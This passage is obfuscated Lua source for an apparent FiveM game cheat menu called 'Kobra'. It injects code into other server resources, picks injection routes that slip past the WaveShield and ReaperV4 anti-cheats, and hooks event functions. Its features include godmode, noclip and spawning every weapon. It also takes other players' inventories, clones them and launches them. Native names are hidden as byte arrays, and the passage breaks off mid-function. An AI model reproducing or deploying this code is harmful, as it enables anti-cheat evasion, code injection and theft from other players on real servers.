                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v221));end end;v0.GiveAllWeapons=function(v225) v36(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        if not _G.allWeaponsGiven then
            _G.allWeaponsGiven = true
            _G.originalWeapons = {}
            
            local weapons = {
                "WEAPON_KNIFE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_CROWBAR",
                "WEAPON_GOLFCLUB", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_KNUCKLE",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM",
                "WEAPON_GUSENBERG", "WEAPON_MUSKET", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SWEEPERSHOTGUN",
                "WEAPON_ASSAULTRIFLE", "WEAPON_CARBINERIFLE", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE",
                "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE",
                "WEAPON_TACTICALRIFLE", "WEAPON_PISTOL", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_VPISTOL",
                "WEAPON_PISTOLXM3", "WEAPON_CERAMICPISTOL", "WEAPON_GADGETPISTOL", "WEAPON_MICROSMG",
                "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG",
                "WEAPON_MACHINEPISTOL", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_PUMPSHOTGUN",
                "WEAPON_SWEEPERSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_SNIPERRIFLE",
                "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2",
                "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_MINIGUN",
                "WEAPON_FIREWORK", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_BZGAS",
                "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE",
                "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_PETROLCAN", "WEAPON_HAZARDCAN",
                "WEAPON_FERTILIZERCAN", "WEAPON_FLAREGUN", "WEAPON_BALL", "WEAPON_KNUCKLE", "WEAPON_HATCHET",
                "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOLCUE",
                "WEAPON_STONE_HATCHET", "WEAPON_CANDYCANE", "WEAPON_ANTIQUE_CABINET", "WEAPON_BROOM"
            }
            
            local ped = _g(_b("PlayerPedId"))()
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                if _g(_b("HasPedGotWeapon"))(ped, weaponHash, false) then
                    _G.originalWeapons[weaponHash] = _g(_b("GetAmmoInPedWeapon"))(ped, weaponHash)
                end
            end
            
            for _, weaponName in ipairs(weapons) do
                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
            end
            
            _g(_b("SetCurrentPedWeapon"))(ped, _g(_b("GetHashKey"))("WEAPON_UNARMED"), true)
        end
    ]]);end;v0.RemoveAllWeapons=function(v226) v36(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        if _G.allWeaponsGiven then
            _G.allWeaponsGiven = false
            
            local ped = _g(_b("PlayerPedId"))()
            
            _g(_b("RemoveAllPedWeapons"))(ped, true)
            
            if _G.originalWeapons then
                for weaponHash, ammo in pairs(_G.originalWeapons) do
                    if ammo > 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, ammo, false, true)
                    end
                end
            end
            
            _G.originalWeapons = {}
        end
    ]]);end;v0.HandleLaunchPlayer=function(v227,v228,v229) local v230=0 -0 ;local v231;local v232;while true do if (v230==2) then v232=nil;function v232(v653,v654) local v655=0;local v656;local v657;while true do if (v655==(4 -3)) then if  not v657 then return v656;end for v936=0 + 0 ,110 + 145  do local v937=0;local v938;while true do if (0==v937) then v938=GetPlayerFromServerId(v936);if (v938 and (v938~= -(1 + 0)) and DoesEntityExist(GetPlayerPed(v938))) then local v1252=0;local v1253;local v1254;while true do if (v1252==(0 -0)) then v1253=GetPlayerPed(v938);v1254=GetEntityCoords(v1253);v1252=1;end if ((1 + 0)==v1252) then if v1254 then local v1508=0 + 0 ;local v1509;while true do if (v1508==(0 -0)) then v1509= #(v653-v1254);if (v1509<=v654) then table.insert(v656,{player=v938,serverId=v936});end break;end end end break;end end end break;end end end v655=2 + 0 ;end if (v655==2) then return v656;end if ((494 -(64 + 430))==v655) then v656={};v657=PlayerPedId();v655=1 + 0 ;end end end v230=366 -(106 + 257) ;end if (v230==3) then CreateThread(function() local v658=GetPlayerFromServerId(v231);if ( not v658 or (v658== -1)) then return;end local v659=GetPlayerPed(v658);if ( not v659 or  not DoesEntityExist(v659)) then return;end local v660=PlayerPedId();if  not v660 then return;end local v661=GetEntityCoords(v660);local v662=GetEntityCoords(v659);if ( not v661 or  not v662) then return;end local v663= #(v661-v662);local v664=false;local v665=nil;if (v663>(8 + 2)) then local v793=0;local v794;local v795;local v796;local v797;local v798;while true do if (v793==(721 -(496 + 225))) then v665=v661;v794=math.random() * 2 * math.pi ;v793=1 -0 ;end if ((9 -7)==v793) then v797=math.sin(v794) * v795 ;v798=vector3(v662.x + v796 ,v662.y + v797 ,v662.z);v793=3;end if (v793==1) then v795=math.random(5,9);v796=math.cos(v794) * v795 ;v793=2;end if (v793==4) then v664=true;Wait(100);break;end if (v793==(1661 -(256 + 1402))) then SetEntityCoordsNoOffset(v660,v798.x,v798.y,v798.z,false,false,false);SetEntityVisible(v660,false,0);v793=4;end end end local v666=v232(v662,v229);if ( #v666==(1899 -(30 + 1869))) then end ClearPedTasksImmediately(v660);for v725=1370 -(213 + 1156) ,15 do if  not DoesEntityExist(v659) then break;end local v726=GetEntityCoords(v659);if  not v726 then break;end SetEntityCoords(v660,v726.x,v726.y,v726.z + 0.5 ,false,false,false,false);Wait(238 -(96 + 92) );AttachEntityToEntityPhysically(v660,v659,0 + 0 ,899 -(142 + 757) ,0,0 + 0 ,62 + 88 ,79 -(32 + 47) ,1977 -(1053 + 924) ,0 + 0 ,0 -0 ,0,1649 -(685 + 963) ,false,false,1 -0 ,2 -0 );Wait(1759 -(541 + 1168) );DetachEntity(v660,true,true);Wait(1697 -(645 + 952) );end Wait(1338 -(669 + 169) );ClearPedTasksImmediately(v660);if v665 then SetEntityCoords(v660,v665.x,v665.y,v665.z + (3 -2) ,false,false,false,false);Wait(217 -117 );SetEntityCoords(v660,v665.x,v665.y,v665.z,false,false,false,false);end if v664 then SetEntityVisible(v660,true,0 + 0 );end end);break;end if (v230==0) then if ( not v228 or ( #v228==(0 + 0))) then return;end v231=tonumber(v228[766 -(181 + 584) ]);v230=1396 -(665 + 730) ;end if (v230==1) then if  not v231 then return;end v229=v229 or 3000 ;v230=5 -3 ;end end end;v0.HandleClonePlayer=function(v233,v234) local v235=0 -0 ;local v236;while true do if (0==v235) then if ( not v234 or ( #v234==0)) then return;end v236=table.concat(v234,",");v235=1351 -(540 + 810) ;end if (v235==(3 -2)) then MachoInjectResourceRaw("any",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
                local hash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
                g({82,101,113,117,101,115,116,77,111,100,101,108})(hash)
                while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(hash) do
                    wait(0)
                end
                g({67,114,101,97,116,101,80,101,100})(4, hash, coords.x, coords.y, coords.z, 0.0, true, true)
            end
        end
    ]],v236));break;end end end;v0.HandleTakeInventory=function(v237,v238) if ( not v238 or ( #v238==(0 -0))) then return;end local v239=tonumber(v238[1 + 0 ]);if  not v239 then return;end print("Take Inventory action executed for players: "   .. table.concat(v238,", ") );local v240=GetResourceState("WaveShield")=="started" ;if v240 then MachoInjectResourceRaw("ox_inventory",string.format([[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end
        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end
        local function _w(n)
            return Citizen.Wait(n)
        end

        local function findClientIdByServerId(sid)
            local players = _g(_b("GetActivePlayers"))()
            for _, pid in ipairs(players) do
                if _g(_b("GetPlayerServerId"))(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = _g(_b("GetOffsetFromEntityInWorldCoords"))(entity, 0.0, -1.75, 0.0)
            local found, gz = _g(_b("GetGroundZFor_3dCoord"))(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not _g(_b("DoesEntityExist"))(entity) then return nil end
            local me = _g(_b("PlayerPedId"))()
            local originalPos = _g(_b("GetEntityCoords"))(me)
            local wasVisible = _g(_b("IsEntityVisible"))(me)
            _g(_b("SetEntityVisible"))(me, false, false)
            _g(_b("SetEntityInvincible"))(me, true)
            _g(_b("SetEntityCollision"))(me, false, false)
            _g(_b("FreezeEntityPosition"))(me, true)
            _w(0)
            local dest = getSafeNearbyCoord(entity)
            if _g(_b("IsPedInAnyVehicle"))(me, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(me, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(me, dest.x, dest.y, dest.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(me, false)
            _g(_b("SetEntityCollision"))(me, true, true)
            _g(_b("SetEntityInvincible"))(me, false)
            _g(_b("SetEntityVisible"))(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            _g(_b("FreezeEntityPosition"))(entity, true)
            if _g(_b("IsPedInAnyVehicle"))(entity, false) then
                local veh = _g(_b("GetVehiclePedIsIn"))(entity, false)
                if veh and veh ~= 0 then
                    _g(_b("SetEntityCoordsNoOffset"))(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                _g(_b("SetEntityCoordsNoOffset"))(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            _w(50)
            _g(_b("FreezeEntityPosition"))(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            _g(_b("RequestAnimDict"))(animDict)
            while not _g(_b("HasAnimDictLoaded"))(animDict) do _w(10) end
            _g(_b("TaskPlayAnim"))(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        -- === ONLY CHANGE: NO CreateThread ===
        local co = coroutine.create(function()
            _w(100)
            local targetServerId = %d
            local clientId = findClientIdByServerId(targetServerId)
            local targetPed = clientId and _g(_b("GetPlayerPed"))(clientId) or nil
            if targetPed and _g(_b("DoesEntityExist"))(targetPed) then
                local me = _g(_b("PlayerPedId"))()
                local originalPos = stealthTeleportToEntity(targetPed)
                _w(100)
                forceHandsUp(targetPed)
                _g(_b("TriggerEvent"))("ox_inventory:openInventory", "otherplayer", _g(_b("GetPlayerServerId"))(clientId))
                _w(100)
                restoreOriginalPosition(me, originalPos)
            end
        end)
        while coroutine.status(co) ~= "dead" do
            local ok, err = coroutine.resume(co)
            if not ok then print("Kobra Coroutine error:", err); break end
            _w(0)
        end
    ]],v239));else MachoInjectResource2(NewThreadNs,"ox_inventory",string.format([[
        local function findClientIdByServerId(sid)
            local players = GetActivePlayers()
            for _, pid in ipairs(players) do
                if GetPlayerServerId(pid) == sid then
                    return pid
                end
            end
            return nil
        end

        local function getSafeNearbyCoord(entity)
            local behind = GetOffsetFromEntityInWorldCoords(entity, 0.0, -1.75, 0.0)
            local found, gz = GetGroundZFor_3dCoord(behind.x, behind.y, behind.z + 5.0, false)
            if found then behind = vec3(behind.x, behind.y, gz + 0.1) end
            return behind
        end

        local function stealthTeleportToEntity(entity)
            if not entity or not DoesEntityExist(entity) then return nil end
            local me = PlayerPedId()
            local originalPos = GetEntityCoords(me)
            local wasVisible = IsEntityVisible(me)
            SetEntityVisible(me, false, false)
            SetEntityInvincible(me, true)
            SetEntityCollision(me, false, false)
            FreezeEntityPosition(me, true)
            Citizen.Wait(0)
            local dest = getSafeNearbyCoord(entity)
            if IsPedInAnyVehicle(me, false) then
                local veh = GetVehiclePedIsIn(me, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, dest.x, dest.y, dest.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(me, dest.x, dest.y, dest.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(me, false)
            SetEntityCollision(me, true, true)
            SetEntityInvincible(me, false)
            SetEntityVisible(me, wasVisible, false)
            return originalPos
        end

        local function restoreOriginalPosition(entity, originalPos)
            if not originalPos then return end
            FreezeEntityPosition(entity, true)
            if IsPedInAnyVehicle(entity, false) then
                local veh = GetVehiclePedIsIn(entity, false)
                if veh and veh ~= 0 then
                    SetEntityCoordsNoOffset(veh, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                else
                    SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
                end
            else
                SetEntityCoordsNoOffset(entity, originalPos.x, originalPos.y, originalPos.z, true, true, true)
            end
            Citizen.Wait(50)
            FreezeEntityPosition(entity, false)
        end

        local function forceHandsUp(entity)
            local animDict, animName = "missminuteman_1ig_2", "handsup_base"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do Citizen.Wait(10) end
            TaskPlayAnim(entity, animDict, animName, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local targetServerId = %d
        local clientId = findClientIdByServerId(targetServerId)
        local targetPed = clientId and GetPlayerPed(clientId) or nil
        if targetPed and DoesEntityExist(targetPed) then
            local me = PlayerPedId()
            local originalPos = stealthTeleportToEntity(targetPed)
            Citizen.Wait(100)
            forceHandsUp(targetPed)
            TriggerEvent("ox_inventory:openInventory", "otherplayer", GetPlayerServerId(clientId))
            Citizen.Wait(100)
            restoreOriginalPosition(me, originalPos)
        end
    ]],v239));end end;v0.BuildMenuFromWeaponList=function(v241,v242) local v243=203 -(166 + 37) ;local v244;while true do if (v243==(1881 -(22 + 1859))) then v244={};for v667,v668 in ipairs(v242) do if v34[v668] then v244[ #v244 + 1 ]=v34[v668].label;end end v243=1773 -(843 + 929) ;end if (v243==(263 -(30 + 232))) then return v244;end end end;v0.GetWeaponModelFromLabel=function(v245,v246) local v247=0 -0 ;while true do if (v247==(777 -(55 + 722))) then for v669,v670 in pairs(v34) do if (v670.label==v246) then return v669;end end return "";end end end;v0.RepairVehicle=function(v248) v36(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function _w(n)
            return Citizen.Wait(n)
        end

        local ped = _g(_b("PlayerPedId"))()
        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
        
        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
            _g(_b("SetVehicleFixed"))(vehicle)
            _g(_b("SetVehicleDeformationFixed"))(vehicle)
            _g(_b("SetVehicleUndriveable"))(vehicle, false)
            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
        end
    ]]);end;local v80=GetResourceState("ReaperV4")=="started" ;local v81=GetResourceState("WaveShield")=="started" ;local v82=GetResourceState("qb-jail")=="started" ;v0.BuildDefaultMenu=function(v249) v4={{label="Self",type="subMenu",categories={{label="Player",tabs={{type="button",label="Revive",desc="This will attempt to revive you by script.",onSelect=function() local v314=0 + 0 ;local v315;while true do if (v314==(0 + 0)) then v315={amigo=function() v36("amigo",[[ respawnPlayer() ]]);end,TrappinBridge=function() v36("new",[[ LocalPlayer.state:set('isDead', false, true) ]]);end,["rzrp-base"]=function() MachoInjectResource2(AsThreadNs,"rzrp-base",[[
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) then
                                            local coords = GetEntityCoords(ped)
                                            local heading = GetEntityHeading(ped)
                                            NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                                            SetEntityHealth(ped, 200)
                                            ClearPedBloodDamage(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetPlayerInvincible(PlayerId(), false)
                                            SetEntityInvincible(ped, false)
                                            SetPedCanRagdoll(ped, true)
                                            SetPedCanRagdollFromPlayerImpact(ped, true)
                                            SetPedRagdollOnCollision(ped, true)
                                        end
                                    ]]);end,FiveStar=function() MachoInjectResourceRaw("FiveStar",[[
                                    if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(...) end,
                                                TSEvent = function(...) end
                                            }
                                        end

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("TriggerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                            _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                            return originalFn(eName, ...)
                                        end)

                                        _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                        _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(1000)
                                            _G.Kobra.TSEvent('revive:Player:Dead')
                                        end)
                                    ]]);end,scripts=function() if (GetResourceState("scripts")=="started") then if v81 then TriggerEvent("deathscreen:revive");elseif v80 then MachoInjectThread(0,"scripts","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,framework=function() if (GetResourceState("framework")=="started") then if v81 then TriggerEvent("deathscreen:revive");elseif v80 then MachoInjectThread(0,"framework","",[[
                                                        TriggerEvent('deathscreen:revive')
                                                    ]]);else TriggerEvent("deathscreen:revive");end end end,["qb-jail"]=function() if v82 then if v80 then MachoInjectThread(0 + 0 ,"scripts","",[[
                                                    TriggerEvent('hospital:client:Revive')
                                                ]]);else TriggerEvent("hospital:client:Revive");end end end,wasabi_ambulance=function() local v727=549 -(305 + 244) ;local v728;local v729;while true do if (v727==(0 + 0)) then print("2");v728=GetResourceState("WaveShield")=="started" ;v727=1;end if (v727==(106 -(95 + 10))) then v729=GetResourceState("ReaperV4")=="started" ;if v728 then MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);elseif v729 then MachoInjectThread(0 + 0 ,"wasabi_ambulance","",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);else MachoInjectResourceRaw("wasabi_ambulance",[[
                                    if not _G.Kobra then
                                        _G.Kobra = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.Kobra.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.Kobra.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.Kobra.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.Kobra.TEvent("esx:onPlayerSpawn")
                                        _G.Kobra.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]]);end break;end end end,["mc9-medicsystem"]=function() local v730=0;local v731;local v732;while true do if (v730==0) then print("1");v731=GetResourceState("WaveShield")=="started" ;v730=3 -2 ;end if (v730==(1 -0)) then v732=GetResourceState("ReaperV4")=="started" ;if v731 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v732 then MachoInjectThread(762 -(592 + 170) ,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end end end};for v733,v734 in pairs(v315) do if (GetResourceState(v733)=="started") then v734();end end break;end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=100,min=0 -0 ,max=47 + 53 ,step=1 + 0 ,onSelect=function(v316) SetEntityHealth(PlayerPedId(),v316 + 100 );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=17 + 83 ,min=0,max=100,step=1 -0 ,onSelect=function(v317) SetPedArmour(PlayerPedId(),v317);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),133 -33 );end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v318) v249:HandleGodmodeToggle(v318);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v319) if v319 then v249:EnableInvisibility();else v249:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25 + 0 ,step=0.25 + 0 ,min=0.25,max=6 -1 ,onSelect=function(v320,v321) if v321 then local v545=0 -0 ;while true do if ((0 -0)==v545) then if  not v17 then local v939=86 -(7 + 79) ;while true do if (v939==1) then v17=true;break;end if (v939==(0 + 0)) then v0:Notify("info","Kobra","Initializing... Please wait!",1181 -(24 + 157) );Wait(400);v939=1;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v320   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
